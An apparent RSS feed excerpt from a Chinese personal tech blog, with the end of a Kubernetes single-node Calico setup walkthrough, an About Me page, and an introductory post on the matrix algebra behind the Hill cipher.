&lt;p>先下载 &lt;code>calico&lt;/code> 的 k8s 资源。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">curl https://docs.projectcalico.org/manifests/calico-typha.yaml -o calico.yaml
&lt;/code>&lt;/pre>&lt;/div>&lt;p>按照说明，判断下 POD 的 CIDR（POD的网段），用 &lt;code>sudo kubectl --kubeconfig /etc/kubernetes/admin.conf get cm kubeadm-config -n kube-system -o yaml&lt;/code> 获取 &lt;code>kubeadm-config&lt;/code> 这个 &lt;code>configmap&lt;/code>，检查其中的 &lt;code>networking.podSubnet&lt;/code> 值。在我这里的输出如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-yaml" data-lang="yaml">&lt;span class="nt">apiVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">v1&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">data&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">ClusterConfiguration&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="sd">
&lt;/span>&lt;span class="sd"> apiServer:
&lt;/span>&lt;span class="sd"> extraArgs:
&lt;/span>&lt;span class="sd"> authorization-mode: Node,RBAC
&lt;/span>&lt;span class="sd"> timeoutForControlPlane: 4m0s
&lt;/span>&lt;span class="sd"> apiVersion: kubeadm.k8s.io/v1beta3
&lt;/span>&lt;span class="sd"> certificatesDir: /etc/kubernetes/pki
&lt;/span>&lt;span class="sd"> clusterName: kubernetes
&lt;/span>&lt;span class="sd"> controllerManager: {}
&lt;/span>&lt;span class="sd"> dns: {}
&lt;/span>&lt;span class="sd"> etcd:
&lt;/span>&lt;span class="sd"> local:
&lt;/span>&lt;span class="sd"> dataDir: /var/lib/etcd
&lt;/span>&lt;span class="sd"> imageRepository: registry.cn-hangzhou.aliyuncs.com/google_containers
&lt;/span>&lt;span class="sd"> kind: ClusterConfiguration
&lt;/span>&lt;span class="sd"> kubernetesVersion: v1.22.4
&lt;/span>&lt;span class="sd"> networking:
&lt;/span>&lt;span class="sd"> dnsDomain: cluster.local
&lt;/span>&lt;span class="sd"> serviceSubnet: 10.96.0.0/12
&lt;/span>&lt;span class="sd"> scheduler: {}&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">kind&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">ConfigMap&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="nt">metadata&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">creationTimestamp&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;2021-11-19T02:54:04Z&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">name&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">kubeadm-config&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">namespace&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">kube-system&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">resourceVersion&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s2">&amp;#34;210&amp;#34;&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nt">uid&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="l">2567d366-2257-4114-8709-12b016cd1fe8&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以发现没有 &lt;code>podSubnet&lt;/code>，那就当是默认，按照 &lt;code>calico&lt;/code> 文档说明不用改 &lt;code>yaml&lt;/code>，正常应用。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo kubectl --kubeconfig /etc/kubernetes/admin.conf apply -f calico.yaml
&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">configmap/calico-config created
customresourcedefinition.apiextensions.k8s.io/bgpconfigurations.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/bgppeers.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/blockaffinities.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/caliconodestatuses.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/clusterinformations.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/felixconfigurations.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/globalnetworkpolicies.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/globalnetworksets.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/hostendpoints.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/ipamblocks.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/ipamconfigs.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/ipamhandles.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/ippools.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/ipreservations.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/kubecontrollersconfigurations.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/networkpolicies.crd.projectcalico.org created
customresourcedefinition.apiextensions.k8s.io/networksets.crd.projectcalico.org created
clusterrole.rbac.authorization.k8s.io/calico-kube-controllers created
clusterrolebinding.rbac.authorization.k8s.io/calico-kube-controllers created
clusterrole.rbac.authorization.k8s.io/calico-node created
clusterrolebinding.rbac.authorization.k8s.io/calico-node created
service/calico-typha created
deployment.apps/calico-typha created
Warning: policy/v1beta1 PodDisruptionBudget is deprecated in v1.21+, unavailable in v1.25+; use policy/v1 PodDisruptionBudget
poddisruptionbudget.policy/calico-typha created
daemonset.apps/calico-node created
serviceaccount/calico-node created
deployment.apps/calico-kube-controllers created
serviceaccount/calico-kube-controllers created
poddisruptionbudget.policy/calico-kube-controllers created
&lt;/code>&lt;/pre>&lt;/div>&lt;p>出现了一个弃用警告，无视之，反正是 &lt;code>calico&lt;/code> 的问题。再检查下相关的 &lt;code>POD&lt;/code> 创建是否成功，用命令 &lt;code>kubectl get pod -n kube-system&lt;/code>，输出如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">NAMESPACE NAME READY STATUS RESTARTS AGE
kube-system calico-kube-controllers-5d995d45d6-gwwrw 1/1 Running 0 5m29s
kube-system calico-node-sgb2x 0/1 Running 2 (49s ago) 5m29s
kube-system calico-typha-7df55cc78b-hpfkx 0/1 Pending 0 5m29s
kube-system coredns-7d89d9b6b8-c7sxl 1/1 Running 0 32m
kube-system coredns-7d89d9b6b8-tjsj8 1/1 Running 0 32m
kube-system etcd-vm 1/1 Running 0 32m
kube-system kube-apiserver-vm 1/1 Running 0 32m
kube-system kube-controller-manager-vm 1/1 Running 0 32m
kube-system kube-proxy-d64kh 1/1 Running 0 32m
kube-system kube-scheduler-vm 1/1 Running 0 32m
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到至少镜像是拉到了。&lt;/p>
&lt;p>&lt;code>calico-typha-7df55cc78b-hpfkx&lt;/code> 这个 POD 的 &lt;code>describe&lt;/code> 显示不能运行在 &lt;code>master&lt;/code> 节点。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">Events:
Type Reason Age From Message
---- ------ ---- ---- -------
Warning FailedScheduling 56s (x9 over 8m57s) default-scheduler 0/1 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn&amp;#39;t tolerate.
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而 &lt;code>calico-node-sgb2x&lt;/code> 的日志显示需要 &lt;code>calico-typha&lt;/code> 才能运行。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">2021-11-19 03:27:46.413 [ERROR][1674] confd/discovery.go 153: Didn&amp;#39;t find any ready Typha instances.
2021-11-19 03:27:46.413 [FATAL][1674] confd/startsyncerclient.go 48: Typha discovery enabled but discovery failed. error=Kubernetes service missing IP or port
bird: Unable to open configuration file /etc/calico/confd/config/bird6.cfg: No such file or directory
&lt;/code>&lt;/pre>&lt;/div>&lt;p>因为想要的是一个单节点集群，所以接下来把本节点的污点 &lt;code>node-role.kubernetes.io/master-&lt;/code> 给去掉。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">sudo kubectl --kubeconfig /etc/kubernetes/admin.conf taint nodes --all node-role.kubernetes.io/master-
&lt;/code>&lt;/pre>&lt;/div>&lt;p>输出&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">node/vm untainted
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再观察 &lt;code>kube-system&lt;/code> 里的 POD 状态。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">NAME READY STATUS RESTARTS AGE
calico-kube-controllers-5d995d45d6-gwwrw 1/1 Running 0 11m
calico-node-sgb2x 1/1 Running 7 (38s ago) 11m
calico-typha-7df55cc78b-hpfkx 1/1 Running 0 11m
coredns-7d89d9b6b8-c7sxl 1/1 Running 0 38m
coredns-7d89d9b6b8-tjsj8 1/1 Running 0 38m
etcd-vm 1/1 Running 0 38m
kube-apiserver-vm 1/1 Running 0 38m
kube-controller-manager-vm 1/1 Running 0 38m
kube-proxy-d64kh 1/1 Running 0 38m
kube-scheduler-vm 1/1 Running 0 38m
&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到所有的POD都已经进入&lt;code>Ready&lt;/code>状态。&lt;/p>
&lt;p>最后通过 &lt;code>kubectl get nodes -o wide&lt;/code> 检查节点状态。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">NAME STATUS ROLES AGE VERSION INTERNAL-IP EXTERNAL-IP OS-IMAGE KERNEL-VERSION CONTAINER-RUNTIME
vm Ready control-plane,master 39m v1.22.4 10.0.2.15 &amp;lt;none&amp;gt; Ubuntu 20.04.3 LTS 5.4.0-90-generic docker://20.10.11
&lt;/code>&lt;/pre>&lt;/div>&lt;p>到这里单节点集群就成功部署了。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;p>之后还可以部署 dashboard 之类的应用验证，不想写了，浪费时间。&lt;/p>
&lt;p>写了一大堆又删掉了。&lt;/p>
&lt;p>如果一定要总结的话，k8s，学了进小厂吧，小厂不用；学了进大厂吧，大厂也不要你。&lt;/p></description></item><item><title>About Me</title><link>https://nnnewb.github.io/blog/about/</link><pubDate>Tue, 16 Nov 2021 14:39:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/about/</guid><description>&lt;h2 id="关于我">关于我&lt;/h2>
&lt;div style="text-align: center;">
&lt;p>一个代码民工，也做过工头。&lt;/p>
&lt;p>擅长 Python、Go、JS/TS，后端专精，前端略懂。&lt;/p>
&lt;p>工作平台 Windows/Linux。Mac虽好但不是我的菜。&lt;/p>
&lt;p>自然，做后端的，Docker、Kubernetes 不能不会。&lt;/p>
&lt;p>我的博客主页：&lt;a href="https://nnnewb.github.io/blog/">nnnewb.github.io/blog&lt;/a>&lt;/p>
&lt;/div></description></item><item><title>密码学入门03 - 古典密码#3</title><link>https://nnnewb.github.io/blog/p/cryptography-introduction-03/</link><pubDate>Tue, 16 Nov 2021 11:31:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/cryptography-introduction-03/</guid><description>&lt;img src="https://nnnewb.github.io/blog/p/cryptography-introduction-03/cover.jpg" alt="Featured image of post 密码学入门03 - 古典密码#3" />&lt;h2 id="前言">前言&lt;/h2>
&lt;p>学习一下 Hill 密码。&lt;/p>
&lt;h2 id="0x01-数学基础">0x01 数学基础&lt;/h2>
&lt;p>参考了 &lt;a class="link" href="https://www.shuxuele.com/algebra/matrix-introduction.html" target="_blank" rel="noopener"
>数学乐&lt;/a> 。没有详细介绍矩阵的意义，但基本运算规则之类的讲得很清楚好懂。&lt;/p>
&lt;h3 id="11-矩阵">1.1 矩阵&lt;/h3>
&lt;p>一个矩阵就是n行m列的数字表格，含义暂不考虑，只学习下矩阵的表示方法、运算规则，不然有点难读懂 Hill 密码的规则。&lt;/p>
&lt;p>一个有 &lt;em>m&lt;/em> 行，&lt;em>n&lt;/em> 列的矩阵 &lt;em>A&lt;/em> 的书写形式如下。
$$
A=\begin{bmatrix}
a_{11} &amp;amp; a_{12} &amp;amp; \dots &amp;amp; a_{1n} \\ a_{21} &amp;amp; a_{22} &amp;amp; \dots &amp;amp; a_{2n} \\ \vdots &amp;amp; \vdots &amp;amp; &amp;amp; \vdots \\ a_{m1} &amp;amp; a_{m2} &amp;amp; \dots &amp;amp; a_{mn}
\end{bmatrix}
$$&lt;/p>
&lt;h3 id="12-矩阵加法减法">1.2 矩阵加法/减法&lt;/h3>
&lt;p>矩阵加减法规则如下。设有矩阵 &lt;em>A&lt;/em>、&lt;em>B&lt;/em> 如下。
$$
A=\begin{bmatrix}
a_{11} &amp;amp; a_{12} &amp;amp; \dots &amp;amp; a_{1n} \\ a_{21} &amp;amp; a_{22} &amp;amp; \dots &amp;amp; a_{2n} \\ \vdots &amp;amp; \vdots &amp;amp; &amp;amp; \vdots \\ a_{m1} &amp;amp; a_{m2} &amp;amp; \dots &amp;amp; a_{mn}
\end{bmatrix},B=\begin{bmatrix}
b_{11} &amp;amp; b_{12} &amp;amp; \dots &amp;amp; b_{1n} \\ b_{21} &amp;amp; b_{22} &amp;amp; \dots &amp;amp; b_{2n} \\ \vdots &amp;amp; \vdots &amp;amp; &amp;amp; \vdots \\ b_{m1} &amp;amp; b_{m2} &amp;amp; \dots &amp;amp; b_{mn}
\end{bmatrix}
$$
则计算 A±B 的规则如下。
$$
A±B=\begin{bmatrix}
a_{11}±b_{11} &amp;amp; a_{12}±b_{12} &amp;amp; \dots &amp;amp; a_{1n}±b_{1n} \\ a_{21}±b_{21} &amp;amp; a_{22}±b_{22} &amp;amp; \dots &amp;amp; a_{2n}±b_{2n} \\ \vdots &amp;amp; \vdots &amp;amp; &amp;amp; \vdots \\ a_{m1}±b_{m1} &amp;amp; a_{m2}±b_{m2} &amp;amp; \dots &amp;amp; a_{mn}±b_{mn}
\end{bmatrix}
$$
性质：&lt;/p>
&lt;ul>
&lt;li>&lt;strong>只有行列数相同的矩阵，加减法才有意义&lt;/strong>&lt;/li>
&lt;li>&lt;strong>矩阵的加减法，就是矩阵中相同位置元素加减&lt;/strong>&lt;/li>
&lt;li>矩阵加减法满足 &lt;strong>交换律&lt;/strong>（&lt;code>A+B=B+A&lt;/code>） 和 &lt;strong>结合律&lt;/strong> （&lt;code>A+(B+C)=(A+B)+c&lt;/code>）&lt;/li>
&lt;/ul>
&lt;h3 id="12-矩阵数乘">1.2 矩阵数乘&lt;/h3>
&lt;p>数λ乘矩阵 &lt;em>A&lt;/em>，即使将数λ乘矩阵A中的每一个元素，记为 &lt;em>λA&lt;/em> 或 &lt;em>Aλ&lt;/em>。&lt;/p>
&lt;p>特别的，称 &lt;em>-A&lt;/em> 为 &lt;em>A&lt;/em> 的负矩阵。&lt;/p>
&lt;p>性质：&lt;/p>
&lt;ul>
&lt;li>满足 &lt;strong>结合律&lt;/strong> （&lt;code>(λμ)A=λ(μA); (λ+μ)A=λA+μA&lt;/code>） 和 &lt;strong>分配律&lt;/strong> （&lt;code>λ(A+B)=λA+λB&lt;/code>）&lt;/li>
&lt;/ul>
&lt;h3 id="13-矩阵乘法">1.3 矩阵乘法&lt;/h3>
&lt;p>先看矩阵的另一种表示形式：&lt;em>A=(a&lt;sub>ij&lt;/sub>)&lt;sub>mxs&lt;/sub>&lt;/em> ，这种表示形式中，&lt;em>m&lt;/em> 表示行数，&lt;em>s&lt;/em> 表示列数，&lt;em>a&lt;sub>ij&lt;/sub>&lt;/em> 姑且当占位，表示矩阵元素。&lt;/p>
&lt;p>设 &lt;em>A=(a&lt;sub>ij&lt;/sub>)&lt;sub>mxs&lt;/sub>&lt;/em> &lt;em>B=(b&lt;sub>ij&lt;/sub>)&lt;sub>sxn&lt;/sub>&lt;/em> ，则 &lt;em>A=AB&lt;/em> 是这样一个矩阵：&lt;/p>
&lt;ol>
&lt;li>行数和左矩阵 &lt;em>A&lt;/em> 相同，列数和右矩阵 &lt;em>B&lt;/em> 相同，即 &lt;em>C=(c&lt;sub>ij&lt;/sub>)&lt;sub>mxn&lt;/sub>&lt;/em> 。&lt;/li>
&lt;li>&lt;em>C&lt;/em> 的第 &lt;em>i&lt;/em> 行第 &lt;em>j&lt;/em> 列的元素 &lt;em>c&lt;sub>ij&lt;/sub>&lt;/em> 由 &lt;em>A&lt;/em> 的第 &lt;em>i&lt;/em> 行元素和 &lt;em>B&lt;/em> 的第 &lt;em>j&lt;/em> 列元素对应相乘，再取乘积之和。&lt;/li>
&lt;/ol>
&lt;p>举例来说，将这两个矩阵相乘。&lt;/p>
&lt;p>$$
A=\begin{bmatrix}
1 &amp;amp; 2 \\ 1 &amp;amp; -1
\end{bmatrix},B=
\begin{bmatrix}
1 &amp;amp; 2 &amp;amp; -3 \\ -1 &amp;amp; 1 &amp;amp; 2
\end{bmatrix}
$$
结果是一个 2x3 的矩阵，每个元素计算如下：
$$
AB=\begin{bmatrix}
(1×1+2×-1) &amp;amp; (1×2+2×1) &amp;amp; (1×-3+2×2) \\ (1×1+-1×-1) &amp;amp; (1×2+-1×1) &amp;amp; (1×-3+-1×2)
\end{bmatrix}=
\begin{bmatrix}
-1 &amp;amp; 4 &amp;amp; 1 \\ 2 &amp;amp; 1 &amp;amp; -5
\end{bmatrix}
$$
先用 &lt;em>A&lt;/em> 的第1行，分别乘 &lt;em>B&lt;/em> 的第1、2、3列，作为结果矩阵 &lt;em>C&lt;/em> 的第1行。然后用 &lt;em>A&lt;/em> 的第2行，分别乘 &lt;em>B&lt;/em> 的第1、2、3列，作为结果矩阵 &lt;em>C&lt;/em> 的第二行。&lt;/p>
&lt;p>注意：相乘的矩阵应该满足条件，左侧矩阵列数等于右侧矩阵行数，计算才能进行。&lt;/p>
&lt;p>性质（假设运算都是可行的）：&lt;/p>
&lt;ol>
&lt;li>符合结合律 &lt;em>(AB)C=A(BC)&lt;/em>&lt;/li>
&lt;li>符合分配律 &lt;em>A(B±C)=AB±AC&lt;/em> （左分配律）; &lt;em>(B±C)A=BA±CA&lt;/em> （右分配律）&lt;/li>
&lt;li>&lt;em>(λA)B=λ(AB)=A(λB)&lt;/em>&lt;/li>
&lt;/ol>
&lt;h3 id="14-矩阵转置">1.4 矩阵转置&lt;/h3>
&lt;p>将 &lt;em>A&lt;/em> 矩阵的行换成同序号的列所得到的新矩阵称为 &lt;em>A&lt;/em> 的转置矩阵，记作 &lt;em>A'&lt;/em> 或者 &lt;em>A&lt;sup>T&lt;/sup>&lt;/em> 。
$$
A=
\begin{bmatrix}
1 &amp;amp; 0 &amp;amp; 3 &amp;amp; -1 \\ 2 &amp;amp; 1 &amp;amp; 0 &amp;amp; 2
\end{bmatrix},A'=A^T=
\begin{bmatrix}
1 &amp;amp; 2 \\ 0 &amp;amp; 1 \\ 3 &amp;amp; 0 \\ -1 &amp;amp; 2
\end{bmatrix}
$$
性质：&lt;/p>
&lt;ol>
&lt;li>&lt;em>(A')'=A&lt;/em>&lt;/li>
&lt;li>&lt;em>(A+B)'=A'+B'&lt;/em>&lt;/li>
&lt;li>&lt;em>(AB)'=B&amp;rsquo;A'&lt;/em>&lt;/li>
&lt;li>&lt;em>(λA)'=λA'&lt;/em>，λ是常数&lt;/li>
&lt;/ol>
&lt;h3 id="15-对称矩阵">1.5 对称矩阵&lt;/h3>
&lt;p>如果矩阵 &lt;em>A&lt;/em> 满足 &lt;em>A'=A&lt;/em> ，即 &lt;em>a&lt;sub>ij&lt;/sub>=a&lt;sub>ji&lt;/sub>&lt;/em> ，则称 &lt;em>A&lt;/em> 为 &lt;strong>对称矩阵&lt;/strong>。&lt;/p>
&lt;p>对称矩阵的特点是它的元素以主对角线为对称轴对应相等。&lt;/p>
&lt;p>举例如下。
$$
A=\begin{bmatrix}
1 &amp;amp; 2 &amp;amp; 3 \\ 2 &amp;amp; 1 &amp;amp; 2 \\ 3 &amp;amp; 2 &amp;amp; 1
\end{bmatrix}
$$&lt;/p>
&lt;p>尝试将这个矩阵转置，令 &lt;em>a&lt;sub>ij&lt;/sub>=a&lt;sub>ji&lt;/sub>&lt;/em> ，得到下面的矩阵，发现的确和原矩阵相同。
$$
A'=\begin{bmatrix}
a_{11} &amp;amp; a_{21} &amp;amp; a_{31} \\ a_{12} &amp;amp; a_{22} &amp;amp; a_{32} \\ a_{13} &amp;amp; a_{23} &amp;amp; a_{33}
\end{bmatrix}=
\begin{bmatrix}
1 &amp;amp; 2 &amp;amp; 3 \\ 2 &amp;amp; 1 &amp;amp; 2 \\ 3 &amp;amp; 2 &amp;amp; 1
\end{bmatrix}
$$&lt;/p>
&lt;p>而原矩阵关于主对角线对称。&lt;/p>
&lt;h3 id="16-单位矩阵">1.6 单位矩阵&lt;/h3>
&lt;p>单位矩阵是除了主对角线上是1，其他数字都是0的矩阵。&lt;strong>任何矩阵和单位矩阵相乘都等于自身&lt;/strong>。&lt;/p>
&lt;p>比如下面这个 3x3 矩阵。
$$
I=\begin{bmatrix}
1 &amp;amp; 0 &amp;amp; 0 \\ 0 &amp;amp; 1 &amp;amp; 0 \\ 0 &amp;amp; 0 &amp;amp; 1
\end{bmatrix}
$$&lt;/p>
&lt;h3 id="17-逆矩阵">1.7 逆矩阵&lt;/h3>
&lt;p>如果有矩阵 &lt;em>B&lt;/em> ，令 &lt;em>BA=AB=I&lt;/em>，其中 &lt;em>I&lt;/em> 为单位矩阵，则称 &lt;em>B&lt;/em> 为 &lt;em>A&lt;/em> 的逆矩阵，记为 &lt;em>A&lt;sup>-1&lt;/sup>&lt;/em> 。对任意矩阵 &lt;em>A&lt;/em> ，逆矩阵并不一定存在。&lt;/p>
&lt;p>逆矩阵的作用是一定程度上代替了矩阵除法运算（矩阵不能做除法），例如已知矩阵A、B，求矩阵X，有下面的式子。&lt;/p>
&lt;p>&lt;em>XA=B&lt;/em>&lt;/p>
&lt;p>如果有除法，那可以直接移项 &lt;em>X=B/A&lt;/em> ，但矩阵只能相乘，所以我们可以在两边都乘上 A 的逆矩阵 &lt;em>A&lt;sup>-1&lt;/sup>&lt;/em> 。&lt;/p>
&lt;p>&lt;em>XAA&lt;sup>-1&lt;/sup>=BA&lt;sup>-1&lt;/sup>&lt;/em>&lt;/p>
&lt;p>因为 &lt;em>AA&lt;sup>-1&lt;/sup>&lt;/em> 得单位矩阵 &lt;em>I&lt;/em> ，所以左侧就变成了 &lt;em>XI&lt;/em>。又因为任何矩阵和单位矩阵相乘都等于自身，所以 &lt;em>XI&lt;/em> 可以简化为 &lt;em>X&lt;/em> 。于是就得到了：&lt;/p>
&lt;p>&lt;em>X=BA&lt;sup>-1&lt;/sup>&lt;/em>&lt;/p>
&lt;p>但是要&lt;strong>注意次序&lt;/strong>！ &lt;em>AX=B&lt;/em> 不能用上述方法做，因为&lt;strong>矩阵乘法不一定满足结合律&lt;/strong> （&lt;em>AB=BA&lt;/em>），对于 &lt;em>AX=B&lt;/em> 的情况，可以将 &lt;em>A&lt;sup>-1&lt;/sup>&lt;/em> 放在式子之前，也就是 &lt;em>A&lt;sup>-1&lt;/sup>AX=A&lt;sup>-1&lt;/sup>B&lt;/em> 。&lt;/p>
&lt;h3 id="18-行列式拉普拉斯展开">1.8 行列式（拉普拉斯展开）&lt;/h3>
&lt;p>矩阵 A 的行列式记为 &lt;em>|A|&lt;/em> ，和绝对值符号一样。只有&lt;strong>方形矩阵&lt;/strong>才能计算行列式。方形矩阵就是行和列数目相等的矩阵。&lt;/p>
&lt;p>首先看 2x2 矩阵。
$$
A=\begin{bmatrix}
a &amp;amp; b \\ c &amp;amp; d
\end{bmatrix},|A|=ad-bc
$$
2x2矩阵的行列式就是简单的交叉相乘再相减。下图中蓝色是正，红色是负。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112142023403.png"
width="122"
height="82"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112142023403_huc11a23cfb761a28dddf43c5ac68c59d6_2679_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112142023403_huc11a23cfb761a28dddf43c5ac68c59d6_2679_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211112142023403"
class="gallery-image"
data-flex-grow="148"
data-flex-basis="357px"
>&lt;/p>
&lt;p>再看 3x3 矩阵的行列式写法，用矩阵第一行的元素，逐个去乘不在和这个元素同一行同一列元素的行列式，最后把这些值用加减号连起来。
$$
\begin{vmatrix}
a &amp;amp; b &amp;amp; c \\ d &amp;amp; e &amp;amp; f \\ g &amp;amp; h &amp;amp; i
\end{vmatrix}=
a
\begin{vmatrix}
e &amp;amp; f \\ h &amp;amp; i
\end{vmatrix}
-b
\begin{vmatrix}
d &amp;amp; f \\ g &amp;amp; i
\end{vmatrix}
+c
\begin{vmatrix}
d &amp;amp; e \\ g &amp;amp; h
\end{vmatrix}
=a(ei-fh)-b(di-fg)+c(dh-eg)
$$
更直观的图形化表示：&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112142439733.png"
width="436"
height="115"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112142439733_hu6459d23d051a17bdb0e4e65aba5ebe8f_9156_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112142439733_hu6459d23d051a17bdb0e4e65aba5ebe8f_9156_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211112142439733"
class="gallery-image"
data-flex-grow="379"
data-flex-basis="909px"
>&lt;/p>
&lt;p>注意这个过程中的加减符号规律，&lt;em>a&lt;sub>11&lt;/sub>×(&amp;hellip;)&lt;/em> 是正，&lt;em>a&lt;sub>12&lt;/sub>×(&amp;hellip;)&lt;/em> 是负，&lt;em>a&lt;sub>13&lt;/sub>×(&amp;hellip;)&lt;/em> 又是正。&lt;/p>
&lt;p>知晓这些规律后再看更大的矩阵，也可以依葫芦画瓢写出行列式。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112143050819.png"
width="590"
height="126"
srcset="https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112143050819_hu6a758e89ff701756d3ce691fff269895_11232_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/cryptography-introduction-03/image-20211112143050819_hu6a758e89ff701756d3ce691fff269895_11232_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20211112143050819"
class="gallery-image"
data-flex-grow="468"
data-flex-basis="1123px"
>&lt;/p>
&lt;p>留意其中正负号出现的规律，&lt;em>+a&lt;sub>11&lt;/sub>&lt;/em> &lt;em>-a&lt;sub>12&lt;/sub>&lt;/em> &lt;em>+a&lt;sub>13&lt;/sub>&lt;/em> &lt;em>-a&lt;sub>14&lt;/sub>&lt;/em> 。&lt;/p>
&lt;p>这种计算方法叫做 &lt;strong>拉普拉斯展开&lt;/strong> 。&lt;/p>
&lt;h3 id="19-求逆矩阵的方法">1.9 求逆矩阵的方法&lt;/h3>
&lt;ul>
&lt;li>2x2 矩阵的逆矩阵&lt;/li>
&lt;li>初等行运算&lt;/li>
&lt;li>余子式、代数余子式和伴随来求逆矩阵&lt;/li>
&lt;/ul>
&lt;p>2x2 矩阵的逆矩阵是：
$$
A^{-1}=\begin{bmatrix}
a &amp;amp; b \\ c &amp;amp; d
\end{bmatrix}^{-1}=
\frac{1}{|A|}
\begin{bmatrix}
d &amp;amp; -b \\ -c &amp;amp; a
\end{bmatrix}
$$&lt;/p>
&lt;ol>
&lt;li>调换 &lt;em>a&lt;sub>11&lt;/sub>&lt;/em> 和 &lt;em>a&lt;sub>22&lt;/sub>&lt;/em>&lt;/li>
&lt;li>&lt;em>a&lt;sub>12&lt;/sub>&lt;/em> 和 &lt;em>a&lt;sub>21&lt;/sub>&lt;/em> 加上负号&lt;/li>
&lt;li>除以原矩阵的行列式&lt;/li>
&lt;/ol>
&lt;p>3x3 或更大的矩阵的逆矩阵求法可以用 &lt;a class="link" href="https://www.shuxuele.com/algebra/matrix-inverse-row-operations-gauss-jordan.html" target="_blank" rel="noopener"
>初等行运算&lt;/a> 或 &lt;a class="link" href="https://www.shuxuele.com/algebra/matrix-inverse-minors-cofactors-adjugate.html" target="_blank" rel="noopener"
>用余子式、代数余子式和伴随 来求逆矩阵&lt;/a> 。&lt;/p>
